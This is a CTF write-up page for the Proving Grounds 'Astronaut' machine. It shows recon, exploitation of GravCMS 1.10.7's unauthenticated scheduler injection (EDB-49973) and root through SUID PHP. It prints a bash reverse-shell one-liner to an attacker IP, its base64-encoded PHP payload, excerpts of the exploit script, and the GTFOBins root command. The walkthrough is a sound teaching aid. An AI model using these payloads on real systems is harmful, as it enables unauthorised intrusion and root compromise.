@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Astronaut &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Astronaut</h1>
+    <div class="meta">Target: <code>192.168.229.12</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">GravCMS</span><span class="tag">CVE</span><span class="tag">YAML</span><span class="tag">UnauthenticatedRCE</span><span class="tag">SUID</span><span class="tag">PHP</span><span class="tag">GTFOBins</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#web-enumeration">Web Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#gravcms-1-10-7-unauthenticated-yaml-write-rce-edb-49973">GravCMS 1.10.7, Unauthenticated YAML Write / RCE (EDB-49973)</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#suid-php-root">SUID PHP → root</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Astronaut is a Proving Grounds Linux box running Grav CMS. Grav 1.10.7 has an unauthenticated vulnerability that writes arbitrary PHP into the scheduler's YAML configuration (EDB-49973), which the scheduler executes on its next run. That gives a shell as <code>www-data</code>. Privilege escalation comes from a SUID bit set on <code>php7.4</code>, which GTFOBins covers with a one-liner to get a root shell.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.41
+|_http-title: Index of /
+</code></pre>
+<p>The Apache directory listing reveals a single directory:</p>
+<pre><code>grav-admin/
+</code></pre>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>Gobuster against <code>/grav-admin/</code> maps the CMS layout:</p>
+<pre><code class="language-sh">gobuster dir -u http://192.168.229.12/grav-admin/ --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 5
+
+/images     (Status: 301)
+/home       (Status: 200)
+/login      (Status: 200)
+/user       (Status: 301)
+/admin      (Status: 200)
+/backup     (Status: 301)
+</code></pre>
+<p>The <code>/admin</code> endpoint is accessible and serves the Grav admin login page.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="gravcms-1-10-7-unauthenticated-yaml-write-rce-edb-49973">GravCMS 1.10.7, Unauthenticated YAML Write / RCE (EDB-49973)</h3>
+<blockquote>
+<p><strong>How this vulnerability works:</strong> the Grav admin scheduler endpoint accepts a POST request that writes a custom job entry to the scheduler's YAML config file. The POST only validates the <code>admin-nonce</code> value, which is visible in the unauthenticated <code>GET /admin</code> page source. No session or credentials are required. The custom job's <code>command</code> field is executed by PHP on the next scheduler tick (approximately every minute), so injecting a PHP-encoded reverse shell payload fires automatically.</p>
+</blockquote>
+<p>Build the base64-encoded reverse shell payload:</p>
+<pre><code class="language-sh">echo -ne &quot;bash -i &gt;&amp; /dev/tcp/192.168.45.244/443 0&gt;&amp;1&quot; | base64 -w0
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjI0NC80NDMgMD4mMQ==
+</code></pre>
+<p>The exploit script fetches the nonce from <code>/grav-admin/admin</code>, then POSTs the scheduler job to <code>/grav-admin/admin/config/scheduler</code>. The key modifications from the stock exploit are updating the target URL from <code>/admin</code> to <code>/grav-admin/admin</code> to match this installation's subdirectory path, and replacing the base64 payload with the one generated above:</p>
+<pre><code class="language-python">target = &quot;http://192.168.229.12&quot;
+payload = b&quot;&quot;&quot;/*&lt;?php /**/
+file_put_contents('/tmp/rev.sh',base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjI0NC80NDMgMD4mMQ=='));
+chmod('/tmp/rev.sh',0755);system('bash /tmp/rev.sh');
+&quot;&quot;&quot;
+
+r = s.get(target+&quot;/grav-admin/admin&quot;)
+adminNonce = re.search(r'admin-nonce&quot; value=&quot;(.*)&quot;',r.text).group(1)
+...
+r = s.post(target+&quot;/grav-admin/admin/config/scheduler&quot;,data=data,headers=headers)
+</code></pre>
+<p>After running the script and waiting approximately 10 seconds for the scheduler:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+connect to [192.168.45.244] from (UNKNOWN) [192.168.229.12] 38768
+www-data@gravity:~/html/grav-admin$
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="suid-php-root">SUID PHP → root</h3>
+<p>LinPEAS identifies <code>php7.4</code> with the SUID bit set. GTFOBins covers SUID PHP with a single command:</p>
+<pre><code class="language-sh">CMD=&quot;/bin/sh&quot;
+php -r &quot;pcntl_exec('/bin/sh', ['-p']);&quot;
+# whoami
+root
+</code></pre>
+<blockquote>
+<p><strong>Why SUID on an interpreter is dangerous:</strong> when a binary has the SUID bit set, it runs with the file owner's privileges (here, root) regardless of who executes it. PHP's <code>pcntl_exec</code> replaces the current process image with a new one, in this case <code>/bin/sh</code>. Because PHP itself is running as root, the spawned shell inherits those privileges. The <code>-p</code> flag tells the shell to preserve the effective UID rather than resetting it to the real UID.</p>
+</blockquote>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh"># cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Unauthenticated CMS scheduler injection requires only a visible nonce.</strong> The nonce in the page source is the only "authentication" protecting this endpoint.</li>
+<li><strong>Scheduler-based payloads fire automatically.</strong> No interaction required after submission; just wait for the next tick.</li>
+<li><strong>SUID interpreters (PHP, Python, Perl) are immediate root.</strong> Any interpreter with SUID set can exec a shell that inherits root's effective UID.</li>
+<li><strong>Subdirectory-installed CMS instances need URL path adjustments.</strong> Stock exploits targeting <code>/admin</code> fail silently when the app lives under <code>/grav-admin/admin</code>.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
